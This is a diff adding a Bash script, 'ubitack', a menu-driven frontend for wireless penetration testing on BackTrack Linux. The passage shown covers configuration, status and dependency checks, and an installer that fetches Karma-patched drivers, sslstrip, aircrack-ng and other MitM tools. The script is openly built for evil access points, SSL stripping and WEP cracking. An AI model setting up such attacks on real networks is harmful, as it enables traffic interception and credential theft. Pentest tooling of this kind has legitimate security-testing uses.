@@ -1,0 +1,3034 @@
+#!/bin/bash
+name="ubitack - Ubiquitous Attack 'n Connect Tool Kit"
+version=0.3
+by=toomsec@gmail.com
+#Written for BT4 Final but also tested on Ubuntu 9.10 and BT4 Pre Final and R1
+#Might work on BT3 or other Linux systems with minor modifications
+#Tested with these wireless chipsets: rt73usb,Atheros AR5001X+  
+
+#Purpose: 
+#Providing a GUI like frontend for tasks like:
+#Connecting to a wireless network, setting up a DNS, SSH or OpenVPN tunnel, running an evil access point, manipulating wireless traffic etc.
+
+
+
+#DEBUG=ON  #ON, OFF switch for debug messages
+DEBUG=OFF  #ON, OFF switch for debug messages
+
+###					        	###
+###        Your attention is required down below	###
+###              Things you need to adapt               ### 
+###	   Please use absolute paths all the time	###
+
+
+CONFDIR=/root/ubitack-0.3/conf #Folder for wireless and other configurations, without trailing "/"
+			 #Wireless config files need to end with: ".wifi" 
+LOGFOLDER=/root/ubitack-0.3/logs/ #Folder for log files. Trailing "/" required!
+TMP=/tmp                  #Folder for temporary files, without trailing "/"
+OPENVPNCONF=$CONFDIR/myserver.ovpn  #Config file for OpenVPN
+SAFEHAVEN=my.server.net  #IP or FQDN of server you use for tunneling home via SSH or VPN
+
+DNSTUNNELDOMAIN=tunnel.mydomain.org #FQDN you have an NS record for, pointing to your tunnel destination 
+			 #You need this entry in the DNS server serving the main domain of $DNSTUNNELDOMAIN 
+#SSHCONF=$CONFDIR/ssh.conf  #Config file for SSH tunnel,NOT YET IMPLEMENTED 
+			    #Use $SSH.. parameters below instead
+SSHUSER=root                #SSH username used at remote server e.g. root
+SSHKEY=notimplementedbynow  #SSH key file used. Full path required
+SSHSERVER=$SAFEHAVEN        #SSH server name. FQDN or IP 
+SSHPORT=22                  #SSH server TCP socket 
+SSHPARAMETERS="-XC -L 12000:192.168.100.5:3128 -L 13000:192.168.100.10:22 "
+                            #SSH parameters for SSH tunnel e.g. "-XC -L 13000:192.168.100.34:80"
+HOSTAPDDIR=~                #directory of hostapd files.Installation routine will install here.
+HOSTAPD=$HOSTAPDDIR/hostap-karma/hostapd/hostapd  #hostapd binary for evil access point.
+HOSTAPDCONF=$CONFDIR/hostapd.conf    #hostapd config file. The settings will be modified on the fly by this script 
+EVILAPACCEPT=$CONFDIR/evilap.accept
+EVILAPDENY=$CONFDIR/evilap.deny
+
+
+###                                                     ###
+###          Things you MIGHT need to adapt             ### 
+###       but works on e.g. BT4 without changes 	###
+###       and if you use the included app installer     ###
+
+WIFIZOO=/pentest/wireless/wifizoo/wifizoo.py #wifizoo.py binary location
+OZYMANDNS=~/bin/droute.pl         #droute.pl binary
+IODINE=/usr/local/sbin/iodine     #iodine DNS-tunnel binary
+IODINED=/usr/local/sbin/iodined   #iodine daemon DNS-tunnel binary
+OPENVPN=/usr/sbin/openvpn         #openvpn binary 
+DNSTUNNELNET=10.0.0               #LAN used for e.g. the Iodine DNS tunnel connection. 
+				  #assuming a /24 network. Sorry for this restriction. 
+				  #Format e.g.: 10.0.0
+WEPBUSTER=/pentest/wireless/wepbuster/wepbuster     #wepbuster.pl binary
+SSID=WLAN                         #SSID used for e.g. the evil AP if not specified
+CHANNEL=6			  #Default wireless channel for e.g. the evil AP if not specified
+EVILAPNET=192.168.167             #LAN of the evil access point. 
+				  #assuming a /24 network. Sorry for this restriction. 
+				  #Format e.g.: 192.168.167
+INTERNETONLINECHECK=199.7.83.42   #IP or FQDN of host used to determine if internet connection is available
+MAC=00:00:de:ad:be:af             #Standard fake MAC address	
+KARMETASPLOITCONF=$CONFDIR/karma.rc #Config file for Karmetsploit evil access point
+KARMETASPLOITLOG=$LOGFOLDER/karmetasploit
+tcpxtract=/usr/local/bin/tcpxtract  #tcpxtract executable location
+sslstrip=/usr/bin/sslstrip        #sslstrip binary location
+WPASUPPLICANTLOG=${LOGFOLDER}wpa_supplicant.log #wpa_supplicant is logging here
+
+
+
+###					        	###
+###    The settings below need no changes on BT4  	###
+###							###
+
+NOW=$(date +"-%b-%d-%y-%H%M%S")	  #Used for various logfiles
+iwconfig=/sbin/iwconfig           #iwconfig binary location 
+iwpriv=/sbin/iwpriv               #iwpriv binary location
+wlanconfig=/usr/local/bin/wlanconfig #$wlanconfig binary location
+wifitap=/pentest/wireless/wifitap #wifitap binary location
+airodump=/usr/local/sbin/airodump-ng    #airodump-ng binary location
+aircrackwepbuster=`which aircrack-ng | sed -e 's/\/aircrack-ng//g'`/aircrack_precompiled  #subfolder for modified aircrack binaries (wepbuster)
+airbase=/usr/local/sbin/airbase-ng      #airodump-ng binary location
+airmon=/usr/local/sbin/airmon-ng        #airmon-ng binary location
+airtun=/usr/local/sbin/airtun-ng        #airtun-ng binary location
+wpa_supplicant=/sbin/wpa_supplicant  #wpa_supplicant binary location
+ssh=/usr/bin/ssh                  #ssh client binary location
+screen=/usr/bin/screen            #screen binary location
+dhcpd=/usr/sbin/dhcpd3            #dhcpd binary location
+DHCPDCONF=/etc/dhcp3/dhcpd_ubitack.conf	  #Variable for dhcpd configuration file
+DHCPDCONFDIR=/etc/dhcp3           #folder for dhcpd config
+LOGFILE=${LOGFOLDER}ubitack.log
+tcpdump=/usr/sbin/tcpdump	  #tcpdump binary location
+dhcpclient=/sbin/dhclient	  #dhcp client binary location 
+ettercap=/usr/sbin/ettercap	  #ettercap binary location
+python=/usr/bin/python            #python binary location
+dsniff=/usr/sbin/dsniff       	  #dsniff binary location
+urlsnarf=/usr/sbin/urlsnarf       #urlsnarf binary location
+msgsnarf=/usr/sbin/msgsnarf       #msgsnarf binary location
+ferret=/pentest/sniffers/hamster/ferret   #ferret binary location
+hamster=/pentest/sniffers/hamster/hamster #ferret binary location
+TheMiddler=/pentest/spoofing/middler/middler.py #TheMiddler binary location
+                                                                                                                                                                                                
+
+###							###
+###    Ports, usually don't need changes                ###
+###							###
+wifizoo_ui_port=8000	          #DONT CHANGE, is hard coded in the script
+wifizoo_proxy_port=8080	  	  #DONT CHANGE, is hard coded in the script
+hamster_proxy_port=8012		  #hamster/ferret web proxy is listening here. default: 1234
+sslstrip_lst_port=8085		  #sslstrip is listening on this port, can be changed
+				  #needs iptables forwarding of port 80 to this port
+sslstrip_mitm_lst_port=8084	  #same for the MitM part (not evil AP)
+middler_lst_port=8081		  #TheMiddler utilizes this port to handle http traffic
+karmetasploit_websrv_port=8088	  #Karmetasploit's web server is listening on this port
+
+
+
+##### colors #####
+RED="\033[1;31m"      #Error
+GREEN="\033[1;32m"    #Success
+MAGENTA="\033[1;35m"  #Question
+BLUE="\033[1;34m"     #Emphasize
+CYAN="\033[1;36m"
+END="\033[m"
+#dark gray:   \033[1;30m
+#light gray:   \033[1;37m
+
+
+########### 		   The script           		 #############
+########### Usually you don`t need to change anything below here #############
+########### 							 #############
+
+
+
+######## Check for network connectivity ########
+check_if_online()
+{
+#Parameters
+#$1 Host to ping (required) 
+#Returns 0 if online and 1 if not online
+
+ if [ "$1" = "" ]; then 
+    echo -e ""$RED"Missing host or IP parameter. Nothing to do!"$END""; 
+    return 1; 
+ fi #missing Parameter
+ if [ $DEBUG = "ON" ]; then echo "Trying to ping $1"; fi
+ ping -c2 -W1 $1 >> $LOGFILE 2>&1 
+ if [ $? -gt 0 ]; then 
+    if [ $DEBUG = "ON" ]; then echo "System isn't reachable, ping sent to $1!" ;fi
+    return 1
+ else
+    if [ $DEBUG = "ON" ]; then echo "DEBUG: System is reachable, ping sent to $1."; fi
+    return 0 #Everything OK
+ fi
+}
+
+
+######## Get wireles clients ######################
+get_wifi_clients()
+{
+# Parameters:  interface(required)
+# $1 interface: [name]
+# if [ -e /proc/net/madwifi/$1/associated_sta ]; then
+  echo -e ""$CYAN"Associated wireless clients: "$END""
+  # If it's an Atheros chipset we find information here:
+  arp -na | grep $EVILAPNET
+#  mac=`cat /proc/net/madwifi/$1/associated_sta 2>> $LOGFILE | grep macaddr | sed 's/macaddr: <//' | sed 's/>//'`
+  if [ $DEBUG = "ON" ]; then echo "DEBUG: mac is: $mac"; fi
+  #if [ x$mac != "x" ]; then echo -e "$mac `arp -an | grep $mac `"; fi
+# else
+  #echo -e ""$CYAN"Associated wireless clients: "$END""
+  # For all other chipsets we do it this way:
+  #ping -c2 -W1 -b $EVILAPNET.255  >> $LOGFILE 2>&1 
+  #arpresult=`arp -n | grep $EVILAPNET`
+  arp -ni $1 2>>$LOGFILE | grep $EVILAPNET 2>>$LOGFILE 
+  #if [ -z $arpresult ]; then 
+  #  echo -e ""$RED"none"$END""
+  #else 
+#    echo -e "\n$arpresult"
+  #fi
+# fi
+
+}
+
+
+######## Get Antenna Diversity ######################
+get_antenna_settings()
+{
+# Parameters:  interface(required)
+# $1 interface: [name]
+ t=`cat /proc/sys/dev/$wifi/txantenna 2>>$LOGFILE 1>&1`
+ if [ $? -eq 1 ]; then 
+   echo -e ""$RED"No antenna info available for $1."$END""
+
+   #echo -en ""$MAGENTA"Press <CR>"$END""; read;
+   return 1
+ else
+  t=`cat /proc/sys/dev/$1/txantenna 2>>$LOGFILE 1>&1`
+  r=`cat /proc/sys/dev/$1/rxantenna 2>>$LOGFILE 1>&1`
+  d=`cat /proc/sys/dev/$1/diversity 2>>$LOGFILE 1>&1`
+  #t=${1:-$t}
+  #r=${2:-$r}
+  #d=${3:-$d}
+  echo -e "Antennas: TX:"$BLUE"$t"$END" RX:"$BLUE"$r"$END" Diversity:"$BLUE"$d"$END""
+ fi
+ return 0
+}
+
+
+######## Display status information #####################
+status_bar()
+{
+# Parameters:  interface(required)
+ INTERNET=No
+ EvilAP=No
+ INTERNETINT=
+ INTERNETIP=
+ DNSSERVER=
+ DEFAULTGW=
+ LANNETMASK=
+ LANNETMASKN=
+ LANNET=
+ # Determine information on internet facing interface, used DNS server etc.
+ if [ $DEBUG = "ON" ]; then echo -e ""$CYAN"Getting public IP"$END""; fi
+
+ INTERNETIP=`wget --timeout=2 -q -O - checkip.dyndns.org|sed -e 's/.*Current IP Address: //' -e 's/<.*$//'`
+
+ if [ $DEBUG = "ON" ]; then echo -e "Current directory==`pwd`"; fi
+ if [ $DEBUG = "ON" ]; then echo -e ""$CYAN"Determine DNS server IP..."$END""; fi
+ if [ -e "/etc/resolv.conf" ]; then
+    DNSSERVER=`cat /etc/resolv.conf | grep -i nameserver | awk '{print $2}'`
+    if [ $DEBUG = "ON" ]; then echo -en "DNS Server entry found in /etc/resolv.conf:  "; fi
+    if [ "$DNSSERVER" != "" ]; then 
+       if [ $DEBUG = "ON" ]; then echo -e ""$GREEN"DEBUG: DNSSERVER $DNSSERVER"$END""; fi
+    else 
+       if [ $DEBUG = "ON" ]; then echo -e ""$RED"DEBUG: DNSSERVER none"$END""; fi
+    fi
+ else 
+    if [ $DEBUG = "ON" ]; then echo -e ""$RED"/etc/resolv.conf not found!"$END""; fi
+ fi
+
+ check_if_online $INTERNETONLINECHECK
+ if [ $? -gt 0 ]; then INTERNET=No; else INTERNET="Yes"; fi
+
+ if [ $DEBUG = "ON" ]; then echo -e ""$CYAN"Getting default gateway IP"$END""; fi
+ DEFAULTGW=`ip route list match 0.0.0.0/0 | cut -d " " -f  3`
+ #DEFAULTGW=`netstat -nr | grep 0.0.0.0 | grep -v 255. | awk '{print $2}'`
+ if [ $DEBUG = "ON" ]; then echo -e ""$GREEN"DEBUG: DEFAULTGW: $DEFAULTGW"$END""; fi
+ INTERNETINT=`netstat -rn | grep -v 255. | grep 0.0.0.0 | awk '{print $8}' | uniq`
+ if [ "$INTERNETINT" != "" ]; then 
+    if [ $DEBUG = "ON" ]; then echo -e "Based on routing information, Internet facing interface: "$GREEN"INTERNETINT=$INTERNETINT"$END""; fi
+    ## Getting the Subnet mask of the local LAN
+    LANNETMASK=`ifconfig -a $INTERNETINT | grep Mask | awk '{print $4}' | sed s/Mask://`
+    if [ $DEBUG = "ON" ]; then echo -e ""$GREEN"DEBUG: LANNETMASK=$LANNETMASK"$END""; fi
+
+    #not required, thought it is for iptables
+    #LANNETMASKN=`netmask $DEFAULTGW/$LANNETMASK   | sed -e 's/\([^\/]*\)\///'`
+
+    if [ $DEBUG = "ON" ]; then echo -e ""$GREEN"DEBUG: LANNETMASKN=$LANNETMASK"$END""; fi
+    LANNET=`route | grep $INTERNETINT | grep -v 0.0.0.0 | grep -v link-local | awk '{print $1}'`
+    if [ $DEBUG = "ON" ]; then echo -e ""$GREEN"DEBUG: LANNET $LANNET"$END""; fi
+
+
+ else 
+    if [ $DEBUG = "ON" ]; then echo -e ""$RED"Based on routing information, no Internet facing Interface found!"$END""; fi
+ fi
+
+
+ check_if_online $EVILAPNET.1
+ if [ $? -gt 0 ]; then EvilAP=No; else EvilAP=Yes; fi
+ echo -en "Internet available: "
+
+ if [ "$INTERNET" = "Yes" ]; then echo -en ""$GREEN"$INTERNET"$END"";
+ else echo -en ""$RED"$INTERNET"$END""; fi
+ echo -e " on interface:"$BLUE"$INTERNETINT"$END",DNS Server:"$BLUE"$DNSSERVER"$END",GW:"$BLUE"$DEFAULTGW"$END""
+ echo -e "Your public IP is: "$BLUE"$INTERNETIP"$END""
+ echo -e "All wireless links: "$BLUE"`cat /proc/net/wireless | grep -v Inter | grep -v face | awk '{if ($3 != 0) print $1 "Link: " $3 }' | sed 's/\.//g'`"$END" "
+ get_wifi_clients $newint
+
+}  #end status_bar()
+
+
+
+
+######## Check requirements and dependencies  ########
+check_requirements()
+{
+#No Parameters
+#Returns 0 if OK, 1 if software is missing, 2 for any other error
+retval=0
+if [ `id -u` != 0 ] ; then
+	echo -e ""$RED"You are not root. Please run this script as root. e.g. with sudo."$END""; exit; retval=2; fi
+
+if [ ! -f  "$wlanconfig" ]; then
+        echo -e ""$RED"Error: $wlanconfig not found. "$END"";
+	echo "It looks like you haven't installed the madwifi-ng drivers for Atheros based wifi cards."
+	echo "You can install madwifi-ng drivers and/or the wireless tools with the built in software installation menu."
+retval=1;
+fi
+
+if [ ! -f "$wpa_supplicant" ]; then 
+	echo -e ""$RED"Error: wpa_supplicant not found! You can't connect to access points"$END""; 
+ 	which=`which wpa_supplicant`; 
+ 	if [ $? -eq 0 ]; then echo -e ""$GREEN"but found wpa_supplicant here: $which. Check the \$wpa_supplicant variable."$END""; wpa_supplicant=$which;  
+	else retval=1; fi
+fi
+
+if [ ! -d "$CONFDIR" ]; then 
+   echo -e ""$RED"Error: Config directory $CONFDIR not found! Please check \$CONFDIR parameter."$END""
+   retval=1 
+   exit
+fi
+
+if [ ! -f "$WIFIZOO" ]; then echo -e ""$RED"Error:"$END" wifizoo not found! You can't use Wifizoo"$END""; retval=1; fi
+
+if [ ! -f "$IODINE" ]; then echo -e ""$RED"Error:"$END" iodine not found! You can't use Iodine DNS Tunnel. "$END""; retval=1;  fi
+
+if [ ! -f "$OPENVPN" ]; then 
+	echo -e ""$RED"Warning:"$END" $OPENVPN not found! You can't use OpenVPN tunnels."$END"";
+ 	which=`which openvpn`; 
+ 	if [ $? -eq 0 ]; then echo -e ""$GREEN"but found openvpn here: $which. Check the \$OPENVPN variable."$END""; OPENVPN=$which; 
+	else retval=1; fi
+fi
+
+
+if [ ! -f "$ettercap" ]; then echo -e ""$RED"Error:"$END" ettercap not found! You can't use MitM functionality. "$END""; 
+ 	which=`which ettercap`; 
+ 	if [ $? -eq 0 ]; then echo -e ""$GREEN"but found ettercap here: $which. Check the \$ettercap variable."$END""; ettercap=$which;  
+	else retval=1; fi
+fi 
+
+if [ ! -f "$airodump" ]; then echo -e ""$RED"Error:"$END" airodump-ng not found! You can't use Aircrack's airodump-ng."$END""; 
+ 	which=`which airodump-ng`; 
+ 	if [ $? -eq 0 ]; then echo -e ""$GREEN"but found airodump-ng here: $which. Check the \$airodump variable."$END""; airodump=$which;
+	else retval=1; fi
+fi
+
+if [ ! -f "$airmon" ]; then echo -e ""$RED"Error:"$END" airmon-ng not found! You can't switch to monitoring mode."$END"";
+ 	which=`which airmon-ng`; 
+ 	if [ $? -eq 0 ]; then echo -e ""$GREEN"but found airmon-ng here: $which. Check the \$airmon variable."$END"";  airmon=$which;
+	else retval=1; fi
+fi
+
+if [ ! -f "$airtun" ]; then echo -e ""$RED"Error:"$END" airtun-ng not found! You can't connect to wireless clients with airtun-ng."$END""; 
+ 	which=`which airtun-ng`; 
+ 	if [ $? -eq 0 ]; then echo -e ""$GREEN"but found airtun-ng here: $which. Check the \$airtun variable."$END""; airtun=$which;
+	else retval=1; fi
+fi
+
+if [ ! -f "$airbase" ]; then echo -e ""$RED"Error:"$END" airbase-ng not found! You can't run an evil access point with airbase-ng."$END""; 
+ 	which=`which airbase-ng`; 
+ 	if [ $? -eq 0 ]; then echo -e ""$GREEN"but found airbase-ng here: $which. Check the \$airbase variable."$END""; airbase=$which;
+	else retval=1; fi
+fi
+
+if [ ! -f "$WEPBUSTER" ]; then echo -e ""$RED"Warning:"$END" wepbuster not found! You can't use the automatic WEP cracking script (WEPBuster). "$END"";
+ 	which=`which wepbuster`; 
+ 	if [ $? -eq 0 ]; then echo -e ""$GREEN"but found wepbuster here: $which. Check the \$WEPBUSTER variable."$END""; WEPBUSTER=$which; 
+	 else retval=1; fi 
+fi
+if [ ! -f "$sslstrip" ]; then echo -e ""$RED"Warning:"$END" sslstrip not found! You can't use the SSL MitM attack with the evil access point. "$END"";
+ 	which=`which sslstrip`; 
+ 	if [ $? -eq 0 ]; then echo -e ""$GREEN"but found sslstip here: $which. Check the \$sslstrip variable."$END""; sslstrip=$which;  
+	 else retval=1; fi
+fi
+
+if [ ! -f "$urlsnarf" ]; then echo -e ""$RED"Warning:"$END" urlsnarf not found! You can't use it with any MitM attack. "$END"";
+ 	which=`which urlsnarf`; 
+ 	if [ $? -eq 0 ]; then echo -e ""$GREEN"but found urlsnarf here: $which. Check the \$urlsnarf variable."$END""; urlsnarf=$which;  
+	else retval=1; fi
+fi
+if [ ! -f "$msgsnarf" ]; then echo -e ""$RED"Warning:"$END" msgsnarf not found! You can't use it with any MitM attack. "$END"";
+ 	which=`which msgsnarf`; 
+ 	if [ $? -eq 0 ]; then echo -e ""$GREEN"but found msgsnarf here: $which. Check the \$msgsnarf variable."$END""; msgsnarf=$which; 
+	else retval=1; fi
+fi
+if [ ! -f "$tcpxtract" ]; then echo -e ""$RED"Warning:"$END" tcpxtract not found! You can't use it with any MitM attack. "$END"";
+ 	which=`which tcpxtract`; 
+ 	if [ $? -eq 0 ]; then echo -e ""$GREEN"but found tcpxtract here: $which. Check the \$tcpxtract variable."$END""; tcpxtract=$which; 
+	else retval=1; fi
+fi
+if [ ! -f "$TheMiddler" ]; then echo -e ""$RED"Warning:"$END" TheMiddler not found! You can't use it with any MitM attack. "$END"";
+ 	which=`which TheMiddler`; 
+ 	if [ $? -eq 0 ]; then echo -e ""$GREEN"but found TheMiddler here: $which. Check the \$TheMiddler variable."$END""; TheMiddler=$which;
+	else retval=1; fi
+fi
+#if [ ! -f "$ferret" ]; then echo -e ""$RED"Warning:"$END" ferret not found! You can't use it with any MitM attack. "$END"";
+# 	which=`which ferret`; 
+# 	if [ $? -eq 0 ]; then echo -e ""$GREEN"but found ferret here: $which. Check the \$ferret variable."$END""; ferret=$which; 
+#	else retval=1; fi
+#fi
+if [ ! -f "$dhcpd" ]; then echo -e ""$RED"Error:"$END" DHCPD not found! You can't provide IP addresses for e.g. the evil access point. "$END"";
+ 	which=`which dhcpd`; 
+ 	if [ $? -eq 0 ]; then echo -e ""$GREEN"but found dhcpd here: $which. Check the \$dhcpd variable."$END""; dhcpd=$which;
+	else retval=1; fi
+fi
+if [ ! -f "$HOSTAPD" ]; then echo -e ""$RED"Warning:"$END" hostapd not found! You can't use it for your evil access point"$END"";
+ 	which=`which hostapd`; 
+ 	if [ $? -eq 0 ]; then echo -e ""$GREEN"but found hostapd here: $which. Check the \$HOSTAPD variable."$END""; HOSTAPD=$which;
+	else retval=1; fi
+fi
+echo "" 
+return $retval
+}
+
+
+######## Install Software ########
+install_software()
+{
+ check_if_online $INTERNETONLINECHECK
+ if [ $? -gt 0 ]; then echo -e ""$RED"Internet access seems down. Software installation requires donwloads from the internet!"$END""; echo -ne ""$MAGENTA"Press <CR>"$END""; read blah;
+ #else  #fi belonging is at the very end of this function
+ fi
+ echo -e ""$RED"This will install software to your system and might destroy your installation. Use at your own risk!"$END"" 
+ echo -e " If this is a fresh BT4 Pre Final installation start with 1) -->"
+ echo -e " 1) Update the entire Backtrack Installation (Kernel, drivers, packages)"
+ echo -e " 2) Install kernel source `uname -r`"
+ echo -e " 3) Install madwifi-ng r4003 drivers with Digininja's Karma extension"
+ echo -e " 4) Install hostap driver with Digininja's Karma extension "
+ echo ""
+ #echo -e " 4) Install latest madwifi-ng drivers from SVN"
+ #echo -e " 5) Install madwifi-ng driver r3925 with aircrack patch"
+ if [ x`which $WIFIZOO` = "x" ]; then
+ echo -e " 6) Install Wifizoo"; fi
+ echo -e " 7) Install OpenVPN 2.1_rc16"
+ echo -e " 8) Install Aircrack-ng"
+ echo -e " 9) Install WEPBuster "
+ echo -e "10) Install Iodine DNS Tunnel"
+ echo -e "11) Install mdk3 Wifi Brutforcer"
+ if [ x`which $sslstrip` = "x" ]; then
+ echo -e "12) Install sslstrip"; fi
+ echo -e "13) Install Skype"
+ echo -e "14) Install tcpxtract"
+ echo -e "15) Install TheMiddler"
+ echo -e "16) Install Python2.6 (requred for Middler)"
+ echo -e "17) Install Ferret 1.1 "
+
+
+    echo -e "99) Main Menu"
+    echo -ne ""$MAGENTA"Your choice: "$END""
+    read instopt
+    case $instopt in 1)
+	echo -e ""$RED"Updating the entire Backtrack installation. Might take aprox. 20 minutes."$END""
+	echo -en ""$GREEN"Press <CR> to proceed or <CTRL-C> to abort: "$END""
+        read blah
+	PWD=`pwd`
+        cd /etc/ssl/certs
+	make-ssl-cert generate-default-snakeoil --force-overwrite
+	cd
+	apt-get update
+	apt-get install -d linux-image
+	#cd /var/cache/apt/archives/
+	#cp -R --preserve=all /lib/modules/2.6.30.7/kernel /lib/modules/2.6.30.7/kernel.old
+	#dpkg -i --force all linux-image-2.6.30.7_2.6.30.7-10.00.Custom_i386.deb
+	apt-get dist-upgrade
+	apt-get install madwifi-drivers
+	apt-get install r8187-drivers
+	echo -e "After the next reboot you might want to issue a: fix-splash"
+
+         #apt-get upgrade && apt-get autoclean
+	cd $PWD
+	echo -e ""$GREEN"Update done. Check output above and press <CR>"$END""
+        read blah
+        ;;	
+	2)
+	#if [ `uname -r` != "2.6.30.9" ]; then
+	#   echo -e ""$RED"You don't have kernel version 2.6.30.9 installed. Press <CR> to proceed though or <CTRL-C> to abort."$END""
+	#   read blah
+	#fi
+	kernelversion=`uname -r`
+	echo -e "Installing kernel sources for version "$kernelversion""
+	apt-get install linux-source-"$kernelversion"
+	olddir=`pwd`
+	cd /usr/src
+	tar xvjf linux-source-"$kernelversion".tar.bz2
+	cd linux-source-"$kernelversion"
+	zcat /proc/config.gz > .config
+	rm /usr/src/linux  
+	ln -s /usr/src/linux-source-"$kernelversion" /usr/src/linux  
+	ln -s /usr/src/linux /lib/modules/"$kernelversion"/build
+	make-kpkg kernel_headers 
+	make scripts
+	cd $olddir
+	echo -e ""$GREEN"Update done. Check output above and press <CR>"$END""
+        read blah
+
+	;;
+
+
+	3)
+	 echo -e ""$RED"Installing Karma patched madwifi-ng drivers"$END""
+	 PWD=`pwd`
+	 cd $TMP
+
+### Use the prepared download from Darkoperator and adapt line 2133 in net... ieee_wireless.c
+### http://www.darkoperator.com/tools-and-scripts/Madwifi-hal-Karma-Injection-Pached.tgz
+### tar xfvz Madwifi-hal-Karma-Injection-Pached.tgz
+### cd madwifi-hal-0.10.5.6-backup/
+### line 2133
+### struct ieee80211vap *vap = dev->priv;
+### struct ieee80211vap *vap = netdev_priv(dev);
+### ./scripts/madwifi-unload
+### make
+### make install
+### depmod -ae
+### modprobe ath_pci 
+### add own diff script
+
+	 wget http://ubitack.googlecode.com/files/madwifi-ng_r4003-karma-BT4.tgz
+	 tar xfvz madwifi-ng_r4003-karma-BT4.tgz
+	 cd madwifi-ng_r4003-hal-0.10.5.6-Karma-Injection_BT4
+    	 make
+    	 ./scripts/madwifi-unload
+    	 make install
+    	 depmod -ae
+    	 modprobe ath_pci
+
+	 cd $PWD
+	 echo -e ""$GREEN"Installation done. Check output above and press <CR>"$END""
+         read blah
+        ;;
+
+
+	 4)
+           echo -e ""$RED"Installing karma'd hostap drivers"$END""
+           PWD=`pwd`
+           cd $HOSTAPDDIR
+           wget http://www.digininja.org/files/hostapd-karma.tar_0.1.tar.bz2
+           tar xfvj ./hostapd-karma.tar_0.1.tar.bz2
+ 	   cd hostap-karma/hostapd
+	   make
+	   cd $PWD
+           echo -e ""$GREEN"Installation done. Check output above and press <CR>"$END""
+           read blah
+        ;;
+#	4)
+#	 echo -e ""$RED"Installing madwifi-ng drivers via SVN"$END""
+#	 echo -e "Make sure you have the current kernel headers available"
+#         #apt-get install madwifi-drivers
+#	 svn checkout http://madwifi-project.org/svn/madwifi/trunk madwifi-ng
+#	 cd madwifi-ng
+#	 make
+#	 ./scripts/madwifi-unload
+#	 make install
+#         echo "You need to blacklist the athXk drivers"
+#	 echo "As an alternative you can switch wireless ddrivers within this tool."
+#	 echo -en ""$MAGENTA"Do you want to blacklist the ath5/9k drivers [Y/n]:"$END""
+#	 read blah
+#	 if [ "x$blah" == "xY" ]; then 
+#	   echo "Adding blacklist entries to /etc/modprobe.d/blacklist"
+#	   grep ath5k /etc/modprobe.d/blacklist >> $LOGFILE 2>&1
+#
+#	   if [ $? -eq 1 ]; then
+#	     echo "Blacklisting ath5k"
+#	     echo "blacklist ath5k" >> /etc/modprobe.d/blacklist
+#	   else echo "Blacklist entry for ath5k already in place"
+#	   fi
+#	   
+#	   grep ath9k /etc/modprobe.d/blacklist >> $LOGFILE 2>&n
+#	   if [ $? -eq 1 ]; then
+#	     echo "blacklisting ath9k"
+#	     echo "blacklist ath9k" >> /etc/modprobe.d/blacklist 
+#	   else echo "Blacklist entry for ath9k already in place"
+#	   fi
+#	 fi
+#	 echo -en ""$MAGENTA"Do you want to load the new drivers [Y/n]:"$END""
+#         read blah
+#         if [ "x$blah" == "xY" ]; then
+#	   echo "Unloading old drivers and loading new driver."
+#	   rmmod ath5k  >> $LOGFILE 2>&1
+#	   rmmod ath9k  >> $LOGFILE 2>&1
+#	   modprobe ath_pci
+#         fi
+#	 echo -e ""$GREEN"Installation done. Check output above and press <CR>"$END""
+#         read blah
+#	 ;;
+
+	5)
+         echo -e ""$RED"Installing aircrack patched madwifi-ng drivers release 3925"$END""
+         PWD=`pwd`
+         cd $TMP
+         svn -r 3925 co http://svn.madwifi-project.org/madwifi/branches/madwifi-hal-0.10.5.6 madwifi-ng
+    	 cd madwifi-ng
+    	 wget http://patches.aircrack-ng.org/madwifi-ng-r3925.patch
+    	 #wget http://www.darkoperator.com/tools-and-scripts/madwifi-hal-digininja-karma-updated_1.patch
+     	 patch -N -p 0 -i madwifi-ng-r3925.patch
+    	 #patch -N -p 0 -i madwifi-hal-digininja-karma-updated_1.patch
+    	 ./scripts/madwifi-unload
+    	 make
+    	 make install
+    	 depmod -ae
+    	 modprobe ath_pci
+         cd $PWD
+         echo -e ""$GREEN"Installation done. Check output above and press <CR>"$END""
+         read blah
+        ;;
+
+    	6)
+	echo -e ""$RED"Installing Wifizoo"$END""
+	PWD=`pwd`
+	cd `echo $WIFIZOO | sed -e 's/\/wifizoo.py//g'`
+	wget http://community.corest.com/~hochoa/wifizoo/wifizoo_v1.3.tgz
+	tar xzvf wifizoo_v1.3.tgz
+	chmod 700 $WIFIZOO
+ 	cd $PWD
+	echo -e ""$GREEN"Installation done. Check output above and press <CR>"$END""	
+	read blah
+  	;;
+	7)
+        echo -e ""$RED"Installing OpenVPN"$END""
+	echo -e ""$MAGENTA"Installing to: /usr/local/sbin. Check \$OPENVPN in this script afterwards."$END""
+	decision=Y
+	if [ -f $OPENVPN ] ; then 
+		echo -e ""$GREEN"Found OpenVPN version: `$OPENVPN \--version | grep OpenVPN | awk '{print $2}'`"$END""
+		echo -en ""$MAGENTA"Do you want to proceed? [Y/N]"$END""
+		read decision
+	fi
+      if [ $decision = "Y" ]; then
+         PWD=`pwd` 
+	 cd $TMP 
+	#echo -e "Installing LZO"
+	#wget http://www.oberhumer.com/opensource/lzo/download/lzo-2.03.tar.gz
+	#tar xzvf lzo-2.03.tar.gz
+	#cd lzo-2.03
+	#./configure
+    	#make
+   	#make check
+    	#make install  
+ 	wget http://openvpn.net/release/openvpn-2.1_rc16.tar.gz
+	tar xzvf openvpn-2.1_rc16.tar.gz
+	cd openvpn-2.1_rc16
+	#./configure --prefix=/usr/local
+	#./configure --disable-lzo
+	./configure 
+	make
+	make install
+	mkdir /etc/openvpn
+	touch /etc/openvpn/openvpn_ssl.conf
+	cd $PWD
+	echo -e ""$GREEN"Installation done. Check output above and press <CR>"$END""
+	read blah
+       fi
+	;;
+	8)
+        echo -e ""$RED"Installing / updating Aircrack-ng"$END""
+	if [ ! -e $TMP/aircrack-ng ]; then mkdir $TMP/aircrack-ng  2>&1; fi
+	cd $TMP/aircrack-ng
+	#svn co http://trac.aircrack-ng.org/svn/trunk $TMP/aircrack-ng 
+	wget http://download.aircrack-ng.org/aircrack-ng-1.0.tar.gz
+	tar xfvz aircrack-ng-1.0.tar.gz
+	cd aircrack-ng-1.0
+	#cd $TMP/aircrack-ng
+	#echo -e "If you need WEPBuster support open another shell and do as follows:"
+	#echo -e "cd $TMP/aircrack-ng/src"
+	#echo -e "vi aircrack-ng.h"
+	#echo -e "Change this variable accordingly: PTW_TRY_STEP  100"
+	#echo -e "vi aireplay-ng.c"
+	#echo -e "Comment the following lines as shown below:"
+	#echo -e 'printf( "\n\nUse this packet ? " );'
+	#echo -e "     ...."
+	#echo -e "     ...."
